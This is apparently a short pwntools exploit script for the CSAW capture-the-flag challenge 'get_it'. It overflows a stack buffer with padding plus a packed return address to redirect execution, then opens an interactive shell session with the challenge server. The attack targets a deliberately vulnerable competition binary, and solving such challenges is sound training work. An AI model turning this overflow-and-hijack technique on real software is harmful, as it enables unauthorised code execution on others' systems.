from pwn import *
from time import sleep
import struct
context.binary = ELF('./get_it')

def pack(x):
    return struct.pack("<L", x)


debug = False
#debug = True
if not debug:
    p = remote('pwn.chal.csaw.io', 9001)
else:
    p = process(context.binary.path)
    gdb.attach(p)
    sleep(0.1)

addr = 0x4005b6

exp_len = 48
packed = p64(addr)
exp = "A" * (exp_len - len(packed)) + packed
#exp = 50 * "A"

print p.readuntil("Do you gets it??")

print exp

p.sendline(exp)

p.interactive()
